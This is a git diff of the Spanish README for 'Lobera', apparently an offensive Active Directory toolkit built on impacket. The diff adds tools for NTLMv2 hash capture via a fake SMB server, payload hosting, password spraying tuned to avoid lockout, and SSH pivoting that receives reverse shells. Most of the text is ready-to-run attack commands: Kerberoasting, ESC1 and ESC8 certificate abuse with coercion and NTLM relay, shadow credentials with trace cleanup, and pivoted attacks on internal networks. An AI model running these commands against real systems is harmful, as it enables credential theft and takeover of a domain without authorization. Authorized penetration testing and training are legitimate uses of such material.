@@ -5,25 +5,26 @@
 <h1 align="center">Lobera</h1>
 
 <p align="center">
-  <strong>Toolkit modular para pentesting de Active Directory</strong><br/>
-  Construido sobre <code>impacket</code> — entiendes los protocolos, no solo las herramientas.
+  <strong>Suite modular de pentesting para Active Directory</strong><br/>
+  Construida sobre <code>impacket</code> — entiendes los protocolos, no solo las herramientas.
 </p>
 
 <p align="center">
   <img src="https://img.shields.io/badge/python-3.10%2B-blue?style=flat-square"/>
   <img src="https://img.shields.io/badge/protocolos-SMB%20·%20Kerberos%20·%20LDAP%20·%20RPC%20·%20WinRM%20·%20SSH%20·%20SSL%20·%20HTTP%20·%20FTP%20·%20MSSQL-red?style=flat-square"/>
   <img src="https://img.shields.io/badge/estado-activo-green?style=flat-square"/>
+  <img src="https://img.shields.io/badge/autor-mitr0kerb-cyan?style=flat-square"/>
 </p>
 
 ---
 
-> ⚠️ **Beta** — muchos scripts están en desarrollo activo. Si encuentras algún problema: 📧 mitr0kerb@gmail.com
+> ⚠️ **Beta** — muchos scripts están en desarrollo activo. Problemas: 📧 mitr0kerb@gmail.com
 
 ---
 
 ## ¿Qué es Lobera?
 
-Lobera es un toolkit modular para enumerar y atacar entornos Active Directory. Cada protocolo está implementado directamente sobre `impacket` — sin wrappers, sin magia negra. El objetivo es entender qué paquete va a qué puerto y por qué.
+Lobera es una suite modular para enumerar y atacar entornos Active Directory. Cada protocolo está implementado directamente sobre `impacket` — sin wrappers, sin magia negra. El objetivo es entender qué paquete va a qué puerto y por qué.
 
 No es un clon de CrackMapExec. Cada llamada mapea a una operación real de protocolo.
 
@@ -34,40 +35,116 @@ No es un clon de CrackMapExec. Cada llamada mapea a una operación real de proto
 ```bash
 git clone git@github.com:mitr0kerb/Lobera.git
 cd Lobera
-pip install -r requirements.txt --break-system-packages
-python3 lobera.py
+pip install -e . --break-system-packages
 ```
 
-**Requisitos:** Python 3.10+, impacket, rich, pyfiglet, pycryptodomex, pyasn1, pywinrm.
+Esto instala tanto el CLI principal (`lobera`) como todas las herramientas de la suite.
+
+**Requisitos:** Python 3.10+, impacket, rich, pyfiglet, pycryptodomex, pyasn1, pywinrm, ldap3, paramiko.
 
 ---
 
-## Tres modos de uso
+## La suite — herramientas independientes
 
-### 1. Modo clásico — CLI directo
+Además del CLI principal, Lobera incluye cuatro herramientas autónomas instaladas como comandos del sistema:
+
+| Herramienta | Descripción |
+|---|---|
+| `lobera-server` | Servidor SMB falso (captura NTLMv2) + HTTP para servir payloads |
+| `lobera-watch` | Monitor de eventos AD en tiempo real vía LDAP |
+| `lobera-spray` | Sprayer multiprotocolo con medidas anti-lockout |
+| `lobera-tunnel` | Proxy SOCKS5 y reenvío de puertos sobre SSH para pivoting |
+
+Cada herramienta muestra su menú completo con ejemplos al ejecutarla sin argumentos.
+
+### lobera-server
+
+```bash
+# Capturar hashes NTLMv2 — apunta víctimas a \\TU_IP\share
+lobera-server smb --ip 0.0.0.0 --port 445 --output hashes.txt
+
+# Servir payloads por HTTP
+lobera-server http --ip 0.0.0.0 --port 8080 --dir /tmp/payloads
+
+# Ambos simultáneos
+lobera-server both --smb-port 8445 --http-port 8080 --output hashes.txt
+```
+
+### lobera-watch
+
+```bash
+# Monitorizar todo con intervalo de 30 segundos
+lobera-watch -t 10.10.10.5 -u auditor -p 'P@ss' -d CORP.LOCAL --interval 30
+
+# Solo cambios en grupos privilegiados, con log
+lobera-watch -t 10.10.10.5 -u auditor -p 'P@ss' -d CORP.LOCAL --filter groups --output eventos.log
+
+# Pass-the-hash
+lobera-watch -t 10.10.10.5 -u admin -H :aad3b435b51404eeaad3b435b51404ee -d CORP.LOCAL
+```
+
+Detecta: nuevos usuarios · cambios de contraseña · lockouts · cambios en DA/EA/Admins · nuevos equipos · GPOs modificadas · SPNs añadidos · delegaciones.
+
+### lobera-spray
+
+```bash
+# SMB con lista de usuarios y contraseñas
+lobera-spray smb -t 10.10.10.5 -U users.txt -P passwords.txt -d CORP.LOCAL --delay 2
+
+# WinRM — un usuario, varias contraseñas
+lobera-spray winrm -t 10.10.10.5 -u admin -P top100.txt -d CORP.LOCAL
+
+# LDAP con pausa entre rondas (anti-lockout estricto)
+lobera-spray ldap -t 10.10.10.5 -U users.txt -P passes.txt -d CORP.LOCAL --rounds 1 --pause 1800
+
+# Todos los protocolos de una vez
+lobera-spray all -t 10.10.10.5 -u admin -p 'Winter2024!' -d CORP.LOCAL
+```
+
+Protocolos: `smb` · `winrm` · `ssh` · `ldap` · `all`. Flags de anti-lockout: `--delay`, `--jitter`, `--rounds`, `--pause`.
+
+### lobera-tunnel
+
+```bash
+# Proxy SOCKS5 — usa con proxychains
+lobera-tunnel socks5 -t 10.10.10.5 -u user -p 'P@ss' --local-port 1080
+proxychains nmap -sV 192.168.1.0/24
+
+# Acceder a RDP interno desde tu máquina
+lobera-tunnel forward -t PIVOT -u user -p 'P@ss' --local-port 13389 --remote-host 192.168.1.10 --remote-port 3389
+
+# Recibir shell reversa del objetivo
+lobera-tunnel reverse -t PIVOT -u user -p 'P@ss' --remote-port 4444 --local-port 4444
+
+# Varios túneles desde YAML
+lobera-tunnel multi -t PIVOT -u user -p 'P@ss' --config tunnels.yaml
+```
+
+---
+
+## CLI principal — tres modos de uso
+
+### 1. Modo clásico
 
 ```bash
 # Ver todos los scripts de un protocolo
-python3 lobera.py smb
+lobera smb
 
-# Ver parámetros de un script
-python3 lobera.py smb --script=shares
-
-# Ejecutar
-python3 lobera.py smb --script=shares -t 10.10.10.5 -u iker -p Pass123!
+# Ejecutar un script
+lobera smb --script=shares -t 10.10.10.5 -u iker -p Pass123!
 
 # Ejecutar una familia entera
-python3 lobera.py ldap --script-fam=enum -t 10.10.10.5 -d CORP.LOCAL -u iker -p Pass123!
+lobera ldap --script-fam=enum -t 10.10.10.5 -d CORP.LOCAL -u iker -p Pass123!
 
 # Simular sin ejecutar nada
-python3 lobera.py smb --script=shares -t 10.10.10.5 -u iker -p Pass123! --dry-run
+lobera smb --script=shares -t 10.10.10.5 -u iker -p Pass123! --dry-run
 ```
 
-### 2. Shell interactivo — consola por protocolo
+### 2. Shell interactivo
 
 ```bash
-python3 lobera.py smb --interactive-shell
-python3 lobera.py kerberos --interactive-shell
+lobera smb --interactive-shell
+lobera kerberos --interactive-shell
 ```
 
 ```
@@ -79,12 +156,12 @@ smb-shell(shares) > load gpp-password
 smb-shell(shares) > run    ← reutiliza target/user
 ```
 
-### 3. Scanner autopwn — escaneo automático por fases
+### 3. Scanner autopwn
 
 ```bash
-python3 lobera.py smb --scanner
-python3 lobera.py ldap --scanner
-python3 lobera.py kerberos --scanner
+lobera smb --scanner
+lobera ldap --scanner
+lobera kerberos --scanner
 ```
 
 ---
@@ -341,17 +418,17 @@ python3 lobera.py kerberos --scanner
 
 ### Kerberoasting → crackeo offline
 ```bash
-lobera.py kerberos --script=kerberoasting -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL
+lobera kerberos --script=kerberoasting -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL
 hashcat -m 13100 hashes.txt rockyou.txt
 ```
 
 ### ESC1 — Certificado como Administrador
 ```bash
 # 1. Buscar plantilla vulnerable
-lobera.py ldap --script=enum-templates -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL
+lobera ldap --script=enum-templates -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL
 
 # 2. Solicitar certificado como Administrator
-lobera.py ldap --script=request-cert -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL \
+lobera ldap --script=request-cert -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL \
   --template VulnTemplate --upn administrator@corp.local --ca CORP-CA
 
 # 3. Obtener TGT + NT hash
@@ -360,29 +437,53 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
 
 ### Coerción + NTLM Relay → ADCS (ESC8)
 ```bash
-# Terminal 1: preparar relay
-lobera.py ldap --script=ntlm-relay-setup -t 10.10.10.5 -d CORP.LOCAL \
+# Terminal 1: relay hacia ADCS
+lobera ldap --script=ntlm-relay-setup -t 10.10.10.5 -d CORP.LOCAL \
   --mode adcs --ca CORP-CA --attacker-ip 10.10.14.1
 
-# Terminal 2: coercionar al DC
-lobera.py rpc --script=coerce -t 10.10.10.5 --listener 10.10.14.1
+# Terminal 2: coercionar al DC con lobera-server
+lobera-server smb --ip 0.0.0.0 --port 8445 --output hashes.txt
+# o directamente desde el CLI
+lobera rpc --script=coerce -t 10.10.10.5 --listener 10.10.14.1
 
 # → cert.pfx como DC$ → DCSync
 certipy auth -pfx dc.pfx -dc-ip 10.10.10.5
 ```
 
+### Spray + relay NTLM
+```bash
+# 1. Spray para encontrar credenciales
+lobera-spray smb -t 10.10.10.5 -U users.txt -P passwords.txt -d CORP.LOCAL --delay 5
+
+# 2. Con credenciales: capturar más hashes internos
+lobera-server smb --ip 0.0.0.0 --port 8445 --output hashes_internos.txt
+```
+
 ### Shadow Credentials → TGT sin cambiar contraseña
 ```bash
-lobera.py ldap --script=shadow-creds -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL \
+lobera ldap --script=shadow-creds -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL \
   --target-user victima
 certipy auth -pfx victima.pfx -dc-ip 10.10.10.5
 # Limpiar rastro
-lobera.py ldap --script=shadow-creds ... --target-user victima --clear
+lobera ldap --script=shadow-creds ... --target-user victima --clear
+```
+
+### Pivoting desde un host comprometido
+```bash
+# 1. Túnel SOCKS5 a través del host comprometido
+lobera-tunnel socks5 -t PIVOT_IP -u user -p 'P@ss' --local-port 1080
+
+# 2. Atacar red interna con proxychains
+proxychains lobera ldap --script=users -t 192.168.1.5 -u iker -p Pass123! -d INT.LOCAL
+proxychains lobera-spray smb -t 192.168.1.0/24 -u admin -p 'Pass!' -d INT.LOCAL
+
+# 3. Monitorizar cambios en el DC interno
+proxychains lobera-watch -t 192.168.1.1 -u auditor -p 'P@ss' -d INT.LOCAL
 ```
 
 ### BloodHound lite — mapa de ataque rápido
 ```bash
-lobera.py ldap --script=bloodhound-lite -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL
+lobera ldap --script=bloodhound-lite -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL
 # → rutas críticas ordenadas por severidad sin levantar BloodHound
 ```
 
@@ -393,11 +494,11 @@ lobera.py ldap --script=bloodhound-lite -t 10.10.10.5 -u iker -p Pass123! -d COR
 Todos los hallazgos, credenciales y objetivos se guardan automáticamente en `lobera.db`.
 
 ```bash
-python3 lobera.py db targets
-python3 lobera.py db findings -t 10.10.10.5
-python3 lobera.py db creds -t 10.10.10.5
-python3 lobera.py db creds -t 10.10.10.5 --show-secret
-python3 lobera.py db delete -t 10.10.10.5
+lobera db targets
+lobera db findings -t 10.10.10.5
+lobera db creds -t 10.10.10.5
+lobera db creds -t 10.10.10.5 --show-secret
+lobera db delete -t 10.10.10.5
 ```
 
 ---
